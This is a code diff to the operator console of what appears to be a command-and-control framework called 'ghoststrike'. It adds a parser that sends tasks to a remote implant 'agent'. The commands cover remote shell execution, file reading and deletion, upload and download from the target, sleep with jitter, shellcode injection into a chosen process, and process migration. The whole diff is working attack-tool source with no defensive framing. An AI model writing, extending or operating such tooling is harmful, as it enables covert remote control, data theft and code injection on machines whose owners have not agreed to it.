@@ -278,24 +278,145 @@ impl App {
         self.input_mode = InputMode::Normal;
 
         if let Some(agent_id) = self.selected_agent {
-            use ghoststrike_common::{Task, TaskCommand, TaskStatus};
-            use chrono::Utc;
-
-            let task = Task {
-                id:           uuid::Uuid::new_v4(),
-                agent_id,
-                operator:     "operator".into(),
-                command:      TaskCommand::Shell { cmd: input.clone() },
-                status:       TaskStatus::Pending,
-                output:       None,
-                created_at:   Utc::now(),
-                completed_at: None,
-            };
-            let msg = OperatorMsg::TaskAgent { task };
-            let _ = self.event_tx.send(Event::Server(msg)).await;
-            self.push_log(format!("> {input}"));
+            match parse_command(&input) {
+                Ok(command) => {
+                    use ghoststrike_common::{Task, TaskStatus};
+                    use chrono::Utc;
+                    let task = Task {
+                        id:           uuid::Uuid::new_v4(),
+                        agent_id,
+                        operator:     "operator".into(),
+                        command,
+                        status:       TaskStatus::Pending,
+                        output:       None,
+                        created_at:   Utc::now(),
+                        completed_at: None,
+                    };
+                    let msg = OperatorMsg::TaskAgent { task };
+                    let _ = self.event_tx.send(Event::Server(msg)).await;
+                    self.push_log(format!("> {input}"));
+                }
+                Err(e) => {
+                    self.push_log(format!("[!] {e}"));
+                }
+            }
         } else {
-            self.push_log("[!] No agent selected");
+            self.push_log("[!] No agent selected — use Up/Down in Agents tab, then Enter");
         }
     }
+}
+
+// ── Command parser ────────────────────────────────────────────────────────────
+
+fn parse_command(input: &str) -> Result<ghoststrike_common::TaskCommand, String> {
+    use ghoststrike_common::TaskCommand;
+
+    let mut parts = shell_split(input);
+    if parts.is_empty() {
+        return Err("empty command".into());
+    }
+    let cmd = parts.remove(0).to_lowercase();
+
+    match cmd.as_str() {
+        "shell" | "cmd" | "exec" => {
+            if parts.is_empty() {
+                return Err("usage: shell <command>".into());
+            }
+            Ok(TaskCommand::Shell { cmd: parts.join(" ") })
+        }
+        "pwd"    => Ok(TaskCommand::Pwd),
+        "whoami" => Ok(TaskCommand::Whoami),
+        "ps"     => Ok(TaskCommand::Ps),
+        "exit"   => Ok(TaskCommand::Exit),
+
+        "ls" | "dir" => {
+            let path = parts.into_iter().next().unwrap_or_else(|| ".".into());
+            Ok(TaskCommand::Ls { path })
+        }
+        "cd" => {
+            let path = parts.into_iter().next()
+                .ok_or("usage: cd <path>")?;
+            Ok(TaskCommand::Cd { path })
+        }
+        "cat" | "type" => {
+            let path = parts.into_iter().next()
+                .ok_or("usage: cat <path>")?;
+            Ok(TaskCommand::Cat { path })
+        }
+        "rm" | "del" => {
+            let path = parts.into_iter().next()
+                .ok_or("usage: rm <path>")?;
+            Ok(TaskCommand::Rm { path })
+        }
+        "mkdir" | "mk" => {
+            let path = parts.into_iter().next()
+                .ok_or("usage: mkdir <path>")?;
+            Ok(TaskCommand::Mk { path })
+        }
+        "download" | "dl" => {
+            let path = parts.into_iter().next()
+                .ok_or("usage: download <remote_path>")?;
+            Ok(TaskCommand::Download { path })
+        }
+        "upload" | "ul" => {
+            if parts.len() < 2 {
+                return Err("usage: upload <local_path> <remote_path>".into());
+            }
+            let local  = &parts[0];
+            let remote = parts[1].clone();
+            let data   = std::fs::read(local)
+                .map_err(|e| format!("cannot read {local}: {e}"))?;
+            Ok(TaskCommand::Upload { path: remote, data })
+        }
+        "sleep" => {
+            let ms = parts.first()
+                .and_then(|s| s.parse::<u64>().ok())
+                .ok_or("usage: sleep <ms>")?;
+            let jitter = parts.get(1)
+                .and_then(|s| s.parse::<u8>().ok())
+                .unwrap_or(10);
+            Ok(TaskCommand::Sleep { ms, jitter })
+        }
+        "inject" => {
+            if parts.len() < 2 {
+                return Err("usage: inject <pid> <shellcode_hex>".into());
+            }
+            let pid = parts[0].parse::<u32>()
+                .map_err(|_| "inject: pid must be a number")?;
+            let shellcode = hex::decode(&parts[1])
+                .map_err(|_| "inject: shellcode must be hex-encoded")?;
+            Ok(TaskCommand::Inject { pid, shellcode })
+        }
+        "migrate" => {
+            let pid = parts.first()
+                .and_then(|s| s.parse::<u32>().ok())
+                .ok_or("usage: migrate <pid>")?;
+            Ok(TaskCommand::Migrate { pid })
+        }
+        // Fallback: treat as a raw shell command.
+        _ => Ok(TaskCommand::Shell { cmd: input.to_string() }),
+    }
+}
+
+/// Minimal shell-like tokeniser: handles double-quoted strings.
+fn shell_split(s: &str) -> Vec<String> {
+    let mut tokens = Vec::new();
+    let mut current = String::new();
+    let mut in_quotes = false;
+
+    for ch in s.chars() {
+        match ch {
+            '"' => in_quotes = !in_quotes,
+            ' ' | '\t' if !in_quotes => {
+                if !current.is_empty() {
+                    tokens.push(std::mem::take(&mut current));
+                }
+            }
+            _ => current.push(ch),
+        }
+    }
+    if !current.is_empty() {
+        tokens.push(current);
+    }
+    tokens
 }
